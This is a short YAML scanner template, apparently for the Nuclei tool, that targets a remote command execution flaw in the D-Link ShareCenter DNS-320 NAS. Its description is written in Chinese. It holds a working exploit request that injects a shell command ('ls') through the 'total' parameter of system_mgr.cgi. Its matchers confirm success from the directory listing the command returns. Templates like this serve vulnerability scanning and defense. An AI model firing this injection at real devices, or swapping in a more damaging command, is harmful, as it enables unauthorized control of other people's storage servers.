id: dlink-sharecenter-dns-320-rce

info:
  name: D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞
  author: HuanXiong
  severity: critical
  description: |
    D-Link ShareCenter DNS-320 system_mgr.cgi 存在远程命令执行，攻击者通过漏洞可以控制服务器
    app="D_Link-DNS-ShareCenter"

  tags: RCE

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls;"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "account_mgr.cgi"
          - "apkg_mgr.cgi"
          - "app_mgr.cgi"
        condition: and
